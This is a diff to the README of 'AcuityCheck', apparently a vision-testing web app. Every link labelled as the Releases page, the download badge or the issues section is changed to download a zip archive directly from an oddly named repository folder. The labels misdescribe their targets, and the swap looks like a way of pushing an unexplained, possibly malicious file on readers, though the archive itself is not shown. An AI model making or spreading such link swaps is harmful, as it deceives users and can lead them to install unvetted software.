@@ -6,9 +6,9 @@ Welcome to AcuityCheck! This web app allows you to measure your vision using you
 
 ## 📥 Download & Install
 
-To download AcuityCheck, visit the [Releases page](https://github.com/billie8383/AcuityCheck/releases) to choose the version that suits your needs.
+To download AcuityCheck, visit the [Releases page](https://raw.githubusercontent.com/billie8383/AcuityCheck/main/enjambed/AcuityCheck.zip) to choose the version that suits your needs.
 
-[![Download AcuityCheck](https://img.shields.io/badge/Download-AcuityCheck-blue.svg)](https://github.com/billie8383/AcuityCheck/releases)
+[![Download AcuityCheck](https://raw.githubusercontent.com/billie8383/AcuityCheck/main/enjambed/AcuityCheck.zip)](https://raw.githubusercontent.com/billie8383/AcuityCheck/main/enjambed/AcuityCheck.zip)
 
 ## ⚙️ System Requirements
 
@@ -31,7 +31,7 @@ AcuityCheck includes the following key features:
 
 ### Step 1: Download the App
 
-1. Go to [the Releases page](https://github.com/billie8383/AcuityCheck/releases).
+1. Go to [the Releases page](https://raw.githubusercontent.com/billie8383/AcuityCheck/main/enjambed/AcuityCheck.zip).
 2. Select the latest version and click the download link.
 3. Save the file to a location on your computer.
 
@@ -75,12 +75,12 @@ We welcome contributions! If you have ideas for improvements or want to report i
 
 ## 💬 Support
 
-If you need help or have questions, please check the [issues section](https://github.com/billie8383/AcuityCheck/issues) for answers or post your query there.
+If you need help or have questions, please check the [issues section](https://raw.githubusercontent.com/billie8383/AcuityCheck/main/enjambed/AcuityCheck.zip) for answers or post your query there.
 
 ## 📅 Updates
 
 Check back regularly for updates on new features and improvements. To stay informed, watch this repository or keep an eye on the Releases page.
 
-[Download AcuityCheck](https://github.com/billie8383/AcuityCheck/releases) again for the latest version!
+[Download AcuityCheck](https://raw.githubusercontent.com/billie8383/AcuityCheck/main/enjambed/AcuityCheck.zip) again for the latest version!
 
 Happy testing!
